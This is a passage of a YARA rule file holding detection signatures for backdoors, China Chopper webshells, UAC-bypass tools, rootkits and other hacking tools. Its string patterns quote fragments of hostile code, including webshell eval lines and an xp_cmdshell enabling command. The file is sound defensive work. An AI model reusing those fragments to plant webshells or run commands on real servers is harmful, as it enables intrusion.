description = "AZZY Backdoor - Sample 1"
author = "Florian Roth"
reference = "https://securelist.com/blog/research/72924/sofacy-apt-hits-high-profile-targets-with-updated-toolset/"
date = "2015-12-04 14:02:21"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "APT, DEMO, EXE, FILE, G0007, MAL, RUSSIA"
minimum_yara = "1.7"
strings:
$s0 = "advstorshell.dll" fullword wide
$s1 = "advshellstore.dll" fullword ascii
$s2 = "Windows Advanced Storage Shell Extension DLL" fullword wide
condition:
uint16 ( 0 ) == 0x5a4d and filesize < 150KB and 2 of them
}
rule SSC_Webshell_ChinaChopper_temp_RID316F : CHINA DEMO HKTL T1100 WEBSHELL {
meta:
description = "Chinese Hacktool Set - file temp.asp"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13 13:22:21"
score = 60
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "CHINA, DEMO, HKTL, T1100, WEBSHELL"
minimum_yara = "1.7"
strings:
$s0 = "o.run \"ff\",Server,Response,Request,Application,Session,Error" fullword ascii
$s1 = "Set o = Server.CreateObject(\"ScriptControl\")" fullword ascii
$s2 = "o.language = \"vbscript\"" fullword ascii
$s3 = "o.addcode(Request(\"SC\"))" fullword ascii
condition:
filesize < 1KB and all of them
}
rule SSC_Webshell_ChinaChopper_temp_3_RID3201 : CHINA DEMO FILE HKTL T1100 WEBSHELL {
meta:
description = "Chinese Hacktool Set - file temp.aspx"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13 13:46:41"
score = 60
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "CHINA, DEMO, FILE, HKTL, T1100, WEBSHELL"
minimum_yara = "1.7"
strings:
$s0 = "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"" ascii
$s1 = "\"],\"unsafe\");%>" ascii
condition:
uint16 ( 0 ) == 0x253c and filesize < 150 and all of them
}
rule SSC_HKTL_CN_Dos_GetPass_RID2DCF : CHINA DEMO EXE FILE HKTL {
meta:
description = "Chinese Hacktool Set - file GetPass.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13 10:47:41"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
modified = "2023-01-06"
tags = "CHINA, DEMO, EXE, FILE, HKTL"
minimum_yara = "1.7"
strings:
$s0 = "GetLogonS" ascii
$s3 = "/showthread.php?t=156643" ascii
$s8 = "To Run As Administ" ascii
$s18 = "EnableDebugPrivileg" fullword ascii
$s19 = "sedebugnameValue" fullword ascii
condition:
uint16 ( 0 ) == 0x5a4d and filesize < 890KB and all of them
}
rule SSC_HKTL_CN_update_PcMain_RID2EAD : CHINA DEMO EXE FILE HKTL {
meta:
description = "Chinese Hacktool Set - file PcMain.dll"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13 11:24:41"
score = 90
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
modified = "2023-01-06"
tags = "CHINA, DEMO, EXE, FILE, HKTL"
minimum_yara = "1.7"
strings:
$s0 = "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.2; .NET CLR 1.1.4322" ascii
$s1 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost" fullword ascii
$s2 = "SOFTWARE\\Classes\\HTTP\\shell\\open\\command" fullword ascii
$s3 = "\\svchost.exe -k " ascii
$s4 = "SYSTEM\\ControlSet001\\Services\\%s" fullword ascii
$s9 = "Global\\%s-key-event" fullword ascii
$s10 = "%d%d.exe" fullword ascii
$s14 = "%d.exe" fullword ascii
$s15 = "Global\\%s-key-metux" fullword ascii
$s18 = "GET / HTTP/1.1" fullword ascii
$s19 = "\\Services\\" ascii
$s20 = "qy001id=%d;qy001guid=%s" fullword ascii
condition:
uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 4 of them
}
rule SSC_HKTL_CN_Dos_sys_RID2C77 : CHINA DEMO EXE FILE HKTL {
meta:
description = "Chinese Hacktool Set - file sys.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13 09:50:21"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
modified = "2023-01-06"
tags = "CHINA, DEMO, EXE, FILE, HKTL"
minimum_yara = "1.7"
strings:
$s0 = "'SeDebugPrivilegeOpen " fullword ascii
$s6 = "Author: Cyg07*2" fullword ascii
$s12 = "from golds7n[LAG]'J" fullword ascii
$s14 = "DAMAGE" fullword ascii
condition:
uint16 ( 0 ) == 0x5a4d and filesize < 150KB and all of them
}
rule SSC_HKTL_CN_Project1_RID2C9B : CHINA DEMO EXE FILE HKTL {
meta:
description = "Chinese Hacktool Set - file Project1.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13 09:56:21"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
modified = "2023-01-06"
tags = "CHINA, DEMO, EXE, FILE, HKTL"
minimum_yara = "1.7"
strings:
$s1 = "EXEC master.dbo.sp_addextendedproc 'xp_cmdshell','xplog70.dll'" fullword ascii
$s2 = "Password.txt" fullword ascii
$s3 = "LoginPrompt" fullword ascii
condition:
uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and all of them
}
rule SSC_HKTL_BypassUacDll_6_RID2DDF : DEMO HKTL SUSP {
meta:
description = "Semiautomatically generated YARA rule - file BypassUacDll.aps"
author = "Florian Roth"
reference = "-"
date = "2014-11-23 10:50:21"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL, SUSP"
minimum_yara = "1.7"
strings:
$s3 = "BypassUacDLL.dll" fullword wide
$s4 = "AFX_IDP_COMMAND_FAILURE" fullword ascii
condition:
all of them
}
rule SSC_HKTL_BypassUac_EXE_RID2D6F : DEMO HKTL SUSP {
meta:
description = "Semiautomatically generated YARA rule - file BypassUacDll.aps"
author = "Florian Roth"
reference = "-"
date = "2014-11-23 10:31:41"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL, SUSP"
minimum_yara = "1.7"
strings:
$s1 = "Wole32.dll" wide
$s3 = "System32\\migwiz" wide
$s4 = "System32\\migwiz\\CRYPTBASE.dll" wide
$s5 = "Elevation:Administrator!new:" wide
$s6 = "BypassUac" wide
condition:
all of them
}
rule SSC_HKTL_DllInjection_RID2D62 : DEMO HKTL T1055 T1100 WEBSHELL {
meta:
description = "Webshells Auto-generated - file DllInjection.exe"
author = "Florian Roth"
reference = "-"
date = "2014-04-07 10:29:31"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL, T1055, T1100, WEBSHELL"
minimum_yara = "1.7"
strings:
$s0 = "\\BDoor\\DllInjecti"
condition:
all of them
}
rule SSC_HKTL_Mithril_v1_45_Mithril_RID3082 : DEMO HKTL T1100 WEBSHELL {
meta:
description = "Webshells Auto-generated - file Mithril.exe"
author = "Florian Roth"
reference = "-"
date = "2014-04-07 12:42:51"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL, T1100, WEBSHELL"
minimum_yara = "1.7"
strings:
$s2 = "cress.exe"
$s7 = "\\Debug\\Mithril."
condition:
all of them
}
rule SSC_HKTL_hkshell_hkrmv_RID2E15 : DEMO HKTL T1100 WEBSHELL {
meta:
description = "Webshells Auto-generated - file hkrmv.exe"
author = "Florian Roth"
reference = "-"
date = "2014-04-07 10:59:21"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL, T1100, WEBSHELL"
minimum_yara = "1.7"
strings:
$s5 = "/THUMBPOSITION7"
$s6 = "\\EvilBlade\\"
condition:
all of them
}
rule SSC_HKTL_bdcli100_RID2B32 : DEMO HKTL T1100 WEBSHELL {
meta:
description = "Webshells Auto-generated - file bdcli100.exe"
author = "Florian Roth"
reference = "-"
date = "2014-04-07 08:56:11"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL, T1100, WEBSHELL"
minimum_yara = "1.7"
strings:
$s5 = "unable to connect to "
$s8 = "backdoor is corrupted on "
condition:
all of them
}
rule SSC_HKTL_HYTop2006_rar_Folder_2006X2_RID314F : DEMO HKTL T1100 WEBSHELL {
meta:
description = "Webshells Auto-generated - file 2006X2.exe"
author = "Florian Roth"
reference = "-"
date = "2014-04-07 13:17:01"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL, T1100, WEBSHELL"
minimum_yara = "1.7"
strings:
$s2 = "Powered By "
$s3 = " \" onClick=\"this.form.sharp.name=this.form.password.value;this.form.action=this."
condition:
all of them
}
rule SSC_HKTL_rdrbs084_RID2B5C : DEMO HKTL T1100 WEBSHELL {
meta:
description = "Webshells Auto-generated - file rdrbs084.exe"
author = "Florian Roth"
reference = "-"
date = "2014-04-07 09:03:11"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL, T1100, WEBSHELL"
minimum_yara = "1.7"
strings:
$s0 = "Create mapped port. You have to specify domain when using HTTP type."
$s8 = "<LOCAL PORT> <MAPPING SERVER> <MAPPING SERVER PORT> <TARGET SERVER> <TARGET"
condition:
all of them
}
rule SSC_HKTL_HYTop_CaseSwitch_2005_RID2FEA : DEMO HKTL T1100 WEBSHELL {
meta:
description = "Webshells Auto-generated - file 2005.exe"
author = "Florian Roth"
reference = "-"
date = "2014-04-07 12:17:31"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL, T1100, WEBSHELL"
minimum_yara = "1.7"
strings:
$s1 = "MSComDlg.CommonDialog"
$s2 = "CommonDialog1"
$s3 = "__vbaExceptHandler"
$s4 = "EVENT_SINK_Release"
$s5 = "EVENT_SINK_AddRef"
$s6 = "By Marcos"
$s7 = "EVENT_SINK_QueryInterface"
$s8 = "MethCallEngine"
condition:
all of them
}
rule SSC_HKTL_HYTop2006_rar_Folder_2006X_RID311D : DEMO HKTL T1100 WEBSHELL {
meta:
description = "Webshells Auto-generated - file 2006X.exe"
author = "Florian Roth"
reference = "-"
date = "2014-04-07 13:08:41"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL, T1100, WEBSHELL"
minimum_yara = "1.7"
strings:
$s1 = "<input name=\"password\" type=\"password\" id=\"password\""
$s6 = "name=\"theAction\" type=\"text\" id=\"theAction\""
condition:
all of them
}
rule SSC_HKTL_PasswordReminder_RID2F2C : DEMO HKTL T1100 WEBSHELL {
meta:
description = "Webshells Auto-generated - file PasswordReminder.exe"
author = "Florian Roth"
reference = "-"
date = "2014-04-07 11:45:51"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL, T1100, WEBSHELL"
minimum_yara = "1.7"
strings:
$s3 = "The encoded password is found at 0x%8.8lx and has a length of %d."
condition:
all of them
}
rule SSC_HKTL_dbgntboot_RID2C66 : DEMO HKTL T1100 WEBSHELL {
meta:
description = "Webshells Auto-generated - file dbgntboot.dll"
author = "Florian Roth"
reference = "-"
date = "2014-04-07 09:47:31"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL, T1100, WEBSHELL"
minimum_yara = "1.7"
strings:
$s2 = "now DOS is working at mode %d,faketype %d,against %s,has worked %d minutes,by sp"
$s3 = "sth junk the M$ Wind0wZ retur"
condition:
all of them
}
rule SSC_HKTL_hxdef100_RID2B43 : DEMO HKTL T1050 T1100 WEBSHELL {
meta:
description = "Webshells Auto-generated - file hxdef100.exe"
author = "Florian Roth"
reference = "-"
date = "2014-04-07 08:59:01"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL, T1050, T1100, WEBSHELL"
minimum_yara = "1.7"
strings:
$s0 = "RtlAnsiStringToUnicodeString"
$s8 = "SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\"
$s9 = "\\\\.\\mailslot\\hxdef-rk100sABCDEFGH"
condition:
all of them
}
rule SSC_HKTL_rdrbs100_RID2B51 : DEMO HKTL T1100 WEBSHELL {
meta:
description = "Webshells Auto-generated - file rdrbs100.exe"
author = "Florian Roth"
reference = "-"
date = "2014-04-07 09:01:21"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL, T1100, WEBSHELL"
minimum_yara = "1.7"
strings:
$s3 = "Server address must be IP in A.B.C.D format."
$s4 = " mapped ports in the list. Currently "
condition:
all of them
}
rule SSC_HKTL_Mithril_tool_RID2D99 : DEMO HKTL T1100 WEBSHELL {
meta:
description = "Webshells Auto-generated - file Mithril.exe"
author = "Florian Roth"
reference = "-"
date = "2014-04-07 10:38:41"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL, T1100, WEBSHELL"
minimum_yara = "1.7"
strings:
$s0 = "OpenProcess error!"
$s1 = "WriteProcessMemory error!"
$s4 = "GetProcAddress error!"
$s5 = "HHt`HHt\\"
$s6 = "Cmaudi0"
$s7 = "CreateRemoteThread error!"
$s8 = "Kernel32"
$s9 = "VirtualAllocEx error!"
condition:
all of them
}
rule SSC_HKTL_hxdef100_2_RID2BD4 : DEMO HKTL T1050 T1100 WEBSHELL {
meta:
description = "Webshells Auto-generated - file hxdef100.exe"
author = "Florian Roth"
reference = "-"
date = "2014-04-07 09:23:11"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL, T1050, T1100, WEBSHELL"
minimum_yara = "1.7"
strings:
$s0 = "\\\\.\\mailslot\\hxdef-rkc000"
$s2 = "Shared Components\\On Access Scanner\\BehaviourBlo"
$s6 = "SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\"
condition:
all of them
}
rule SSC_HKTL_Release_dllTest_RID2E9F : DEMO HKTL T1100 WEBSHELL {
meta:
description = "Webshells Auto-generated - file dllTest.dll"
author = "Florian Roth"
reference = "-"
date = "2014-04-07 11:22:21"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL, T1100, WEBSHELL"
minimum_yara = "1.7"
strings:
$s0 = ";;;Y;`;d;h;l;p;t;x;|;"
$s1 = "0 0&00060K0R0X0f0l0q0w0"
$s2 = ": :$:(:,:0:4:8:D:`=d="
$s3 = "4@5P5T5\\5T7\\7d7l7t7|7"
$s4 = "1,121>1C1K1Q1X1^1e1k1s1y1"
$s5 = "9 9$9(9,9P9X9\\9`9d9h9l9p9t9x9|9"
$s6 = "0)0O0\\0a0o0\"1E1P1q1"
$s7 = "<.<I<d<h<l<p<t<x<|<"
$s8 = "3&31383>3F3Q3X3`3f3w3|3"
$s9 = "8@;D;H;L;P;T;X;\\;a;9=W=z="
condition:
all of them
}
rule SSC_HKTL_hkdoordll_RID2C66 : DEMO HKTL T1100 WEBSHELL {
meta:
description = "Webshells Auto-generated - file hkdoordll.dll"
author = "Florian Roth"
reference = "-"
date = "2014-04-07 09:47:31"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL, T1100, WEBSHELL"
minimum_yara = "1.7"
strings:
$s6 = "Can't uninstall,maybe the backdoor is not installed or,the Password you INPUT is"
condition:
all of them
}
rule SSC_HKTL_Mithril_v1_45_dllTest_RID3085 : DEMO HKTL T1100 WEBSHELL {
meta:
description = "Webshells Auto-generated - file dllTest.dll"
author = "Florian Roth"
reference = "-"
date = "2014-04-07 12:43:21"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL, T1100, WEBSHELL"
minimum_yara = "1.7"
strings:
$s3 = "syspath"
$s4 = "\\Mithril"
$s5 = "--list the services in the computer"
condition:
all of them
}
rule SSC_HKTL_dbgiis6cli_RID2C83 : DEMO HKTL T1100 WEBSHELL {
meta:
description = "Webshells Auto-generated - file dbgiis6cli.exe"
author = "Florian Roth"
reference = "-"
date = "2014-04-07 09:52:21"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL, T1100, WEBSHELL"
minimum_yara = "1.7"
strings:
$s0 = "User-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)"
$s5 = "###command:(NO more than 100 bytes!)"
condition:
all of them
}
rule SSC_HKTL_Debug_cress_RID2D09 : DEMO HKTL T1100 WEBSHELL {
meta:
description = "Webshells Auto-generated - file cress.exe"
author = "Florian Roth"
reference = "-"
date = "2014-04-07 10:14:41"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL, T1100, WEBSHELL"
minimum_yara = "1.7"
strings:
$s0 = "\\Mithril "
$s4 = "Mithril.exe"
condition:
all of them
}
rule SSC_HKTL_adjustcr_RID2C03 : DEMO HKTL T1100 WEBSHELL {
meta:
description = "Webshells Auto-generated - file adjustcr.exe"
author = "Florian Roth"
reference = "-"
date = "2014-04-07 09:31:01"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL, T1100, WEBSHELL"
minimum_yara = "1.7"
strings:
$s0 = "$Info: This file is packed with the UPX executable packer $"
$s2 = "$License: NRV for UPX is distributed under special license $"
$s6 = "AdjustCR Carr"
$s7 = "ION\\System\\FloatingPo"
condition:
all of them
}
rule SSC_HKTL_EditServer_2_RID2D31 : DEMO HKTL T1100 WEBSHELL {
meta:
description = "Webshells Auto-generated - file EditServer.exe"
author = "Florian Roth"
reference = "-"
date = "2014-04-07 10:21:21"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL, T1100, WEBSHELL"
minimum_yara = "1.7"
strings:
$s0 = "@HOTMAIL.COM"
$s1 = "Press Any Ke"
$s3 = "glish MenuZ"
condition:
all of them
}
rule SSC_HKTL_by064cli_RID2B50 : DEMO HKTL T1100 WEBSHELL {
meta:
description = "Webshells Auto-generated - file by064cli.exe"
author = "Florian Roth"
reference = "-"
date = "2014-04-07 09:01:11"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL, T1100, WEBSHELL"
minimum_yara = "1.7"
strings:
$s7 = "packet dropped,redirecting"
$s9 = "input the password(the default one is 'by')"
condition:
all of them
}
rule SSC_HKTL_Mithril_dllTest_RID2EB7 : DEMO HKTL T1100 WEBSHELL {
meta:
description = "Webshells Auto-generated - file dllTest.dll"
author = "Florian Roth"
reference = "-"
date = "2014-04-07 11:26:21"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL, T1100, WEBSHELL"
minimum_yara = "1.7"
strings:
$s0 = "please enter the password:"
$s3 = "\\dllTest.pdb"
condition:
all of them
}
rule SSC_HKTL_peek_a_boo_RID2CA7 : DEMO HKTL T1100 WEBSHELL {
meta:
description = "Webshells Auto-generated - file peek-a-boo.exe"
author = "Florian Roth"
reference = "-"
date = "2014-04-07 09:58:21"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL, T1100, WEBSHELL"
minimum_yara = "1.7"
strings:
$s0 = "__vbaHresultCheckObj"
$s1 = "\\VB\\VB5.OLB"
$s2 = "capGetDriverDescriptionA"
$s3 = "__vbaExceptHandler"
$s4 = "EVENT_SINK_Release"
$s8 = "__vbaErrorOverflow"
condition:
all of them
}
rule SSC_HKTL_Debug_dllTest_2_RID2E56 : DEMO HKTL T1100 WEBSHELL {
meta:
description = "Webshells Auto-generated - file dllTest.dll"
author = "Florian Roth"
reference = "-"
date = "2014-04-07 11:10:11"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL, T1100, WEBSHELL"
minimum_yara = "1.7"
strings:
$s4 = "\\Debug\\dllTest.pdb"
$s5 = "--list the services in the computer"
condition:
all of them
}
rule SSC_HKTL_shelltools_g0t_root_HideRun_RID3387 : DEMO HKTL T1100 WEBSHELL {
meta:
description = "Webshells Auto-generated - file HideRun.exe"
author = "Florian Roth"
reference = "-"
date = "2014-04-07 14:51:41"
score = 90
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL, T1100, WEBSHELL"
minimum_yara = "1.7"
strings:
$s0 = "Usage -- hiderun [AppName]"
$s7 = "PVAX SW, Alexey A. Popoff, Moscow, 1997."
condition:
all of them
}
rule SSC_HKTL_ZXshell2_0_rar_Folder_zxrecv_RID338E : DEMO HKTL T1100 WEBSHELL {
meta:
description = "Webshells Auto-generated - file zxrecv.exe"
author = "Florian Roth"
reference = "-"
date = "2014-04-07 14:52:51"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL, T1100, WEBSHELL"
minimum_yara = "1.7"
strings:
$s0 = "RyFlushBuff"
$s1 = "teToWideChar^FiYP"
$s2 = "mdesc+8F D"
$s3 = "\\von76std"
$s4 = "5pur+virtul"
$s5 = "- Kablto io"
$s6 = "ac#f{lowi8a"
condition:
all of them
}
rule SSC_HKTL_root_040_zip_Folder_deploy_RID32B3 : DEMO HKTL T1100 WEBSHELL {
meta:
description = "Webshells Auto-generated - file deploy.exe"
author = "Florian Roth"
reference = "-"
date = "2014-04-07 14:16:21"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL, T1100, WEBSHELL"
minimum_yara = "1.7"
strings:
$s5 = "halon synscan 127.0.0.1 1-65536"
$s8 = "Obviously you replace the ip address with that of the target."
condition:
all of them
}
rule SSC_HKTL_by063cli_RID2B4F : DEMO HKTL T1100 WEBSHELL {
meta:
description = "Webshells Auto-generated - file by063cli.exe"
author = "Florian Roth"
reference = "-"
date = "2014-04-07 09:01:01"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL, T1100, WEBSHELL"
minimum_yara = "1.7"
strings:
$s2 = "#popmsghello,are you all right?"
$s4 = "connect failed,check your network and remote ip."
condition:
all of them
}
rule SSC_HKTL_byshell063_ntboot_2_RID2FB5 : DEMO HKTL T1100 WEBSHELL {
meta:
description = "Webshells Auto-generated - file ntboot.dll"
author = "Florian Roth"
reference = "-"
date = "2014-04-07 12:08:41"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL, T1100, WEBSHELL"
minimum_yara = "1.7"
strings:
$s6 = "OK,job was done,cuz we have localsystem & SE_DEBUG_NAME:)"
condition:
all of them
}
rule SSC_HKTL_u_uay_RID2AC6 : DEMO HKTL T1050 T1100 WEBSHELL {
meta:
description = "Webshells Auto-generated - file uay.exe"
author = "Florian Roth"
reference = "-"
date = "2014-04-07 08:21:41"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL, T1050, T1100, WEBSHELL"
minimum_yara = "1.7"
strings:
$s1 = "exec \"c:\\WINDOWS\\System32\\freecell.exe"
$s9 = "SYSTEM\\CurrentControlSet\\Services\\uay.sys\\Security"
condition:
1 of them
}
rule SSC_HKTL_pwreveal_RID2C09 : DEMO HKTL T1100 WEBSHELL {
meta:
description = "Webshells Auto-generated - file pwreveal.exe"
author = "Florian Roth"
reference = "-"
date = "2014-04-07 09:32:01"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL, T1100, WEBSHELL"
minimum_yara = "1.7"
strings:
$s0 = "*<Blank - no es"
$s3 = "JDiamondCS "
$s8 = "sword set> [Leith=0 bytes]"
$s9 = "ION\\System\\Floating-"
condition:
all of them
}
rule SSC_HKTL_vanquish_2_RID2CA3 : DEMO HKTL T1100 WEBSHELL {
meta:
description = "Webshells Auto-generated - file vanquish.exe"
author = "Florian Roth"
reference = "-"
date = "2014-04-07 09:57:41"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL, T1100, WEBSHELL"
minimum_yara = "1.7"
strings:
$s2 = "Vanquish - DLL injection failed:"
condition:
all of them
}
rule SSC_HKTL_portlessinst_RID2DDD : DEMO HKTL T1100 WEBSHELL {
meta:
description = "Webshells Auto-generated - file portlessinst.exe"
author = "Florian Roth"
reference = "-"
date = "2014-04-07 10:50:01"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL, T1100, WEBSHELL"
minimum_yara = "1.7"
strings:
$s2 = "Fail To Open Registry"
$s3 = "f<-WLEggDr\""
$s6 = "oMemoryCreateP"
condition:
all of them
}
rule SSC_HKTL_SetupBDoor_RID2C8A : DEMO HKTL T1100 WEBSHELL {
meta:
description = "Webshells Auto-generated - file SetupBDoor.exe"
author = "Florian Roth"
reference = "-"
date = "2014-04-07 09:53:31"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL, T1100, WEBSHELL"
minimum_yara = "1.7"
strings:
$s1 = "\\BDoor\\SetupBDoor"
condition:
all of them
}
rule SSC_HKTL_BIN_Server_RID2C52 : DEMO HKTL T1100 WEBSHELL {
meta:
description = "Webshells Auto-generated - file Server.exe"
author = "Florian Roth"
reference = "-"
date = "2014-04-07 09:44:11"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL, T1100, WEBSHELL"
minimum_yara = "1.7"
strings:
$s0 = "configserver"
$s1 = "GetLogicalDrives"
$s2 = "WinExec"
$s4 = "fxftest"
$s5 = "upfileok"
$s7 = "upfileer"
condition:
all of them
}
rule SSC_HKTL_HDConfig_RID2B85 : DEMO HKTL T1100 WEBSHELL {
meta:
description = "Webshells Auto-generated - file HDConfig.exe"
author = "Florian Roth"
reference = "-"
date = "2014-04-07 09:10:01"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL, T1100, WEBSHELL"
minimum_yara = "1.7"
strings:
$s0 = "An encryption key is derived from the password hash. "
$s3 = "A hash object has been created. "
$s4 = "Error during CryptCreateHash!"
$s5 = "A new key container has been created."
$s6 = "The password has been added to the hash. "
condition:
all of them
}
rule SSC_HKTL_Unpack_Injectt_RID2E35 : DEMO HKTL T1100 WEBSHELL {
meta:
description = "Webshells Auto-generated - file Injectt.exe"
author = "Florian Roth"
reference = "-"
date = "2014-04-06 11:04:41"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL, T1100, WEBSHELL"
minimum_yara = "1.7"
strings:
$s2 = "%s -Run                              -->To Install And Run The Service"
$s3 = "%s -Uninstall                        -->To Uninstall The Service"
$s4 = "(STANDARD_RIGHTS_REQUIRED |SC_MANAGER_CONNECT |SC_MANAGER_CREATE_SERVICE |SC_MAN"
condition:
all of them
}
rule SSC_HKTL_shelltools_g0t_root_uptime_RID336C : DEMO HKTL T1100 WEBSHELL {
meta:
description = "Webshells Auto-generated - file uptime.exe"
author = "Florian Roth"
reference = "-"
date = "2014-04-06 14:47:11"
score = 75
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL, T1100, WEBSHELL"
minimum_yara = "1.7"
strings:
$s0 = "JDiamondCSlC~"
$s1 = "CharactQA"
$s2 = "$Info: This file is packed with the UPX executable packer $"
$s5 = "HandlereateConso"
$s7 = "ION\\System\\FloatingPo"
condition:
all of them
}
rule SSC_HKTL_Fierce2_RID2B23 : DEMO HKTL {
meta:
description = "This signature detects the Fierce2 domain scanner"
author = "Florian Roth"
reference = "-"
date = "2014-01-07 08:53:41"
score = 60
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL"
minimum_yara = "1.7"
strings:
$s1 = "$tt_xml->process( 'end_domainscan.tt', $end_domainscan_vars,"
condition:
1 of them
}
rule SSC_HKTL_Ncrack_RID2AF5 : DEMO HKTL T1110 {
meta:
description = "This signature detects the Ncrack brute force tool"
author = "Florian Roth"
reference = "-"
date = "2014-01-07 09:40:01"
score = 60
customer = "demo"
license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
tags = "DEMO, HKTL, T1110"
minimum_yara = "1.7"
strings:
$s1 = "NcrackOutputTable only supports adding up to 4096 to a cell via"
condition:
1 of them
}
rule SSC_HKTL_SQLMap_RID2AB1 : DEMO HKTL {
meta:
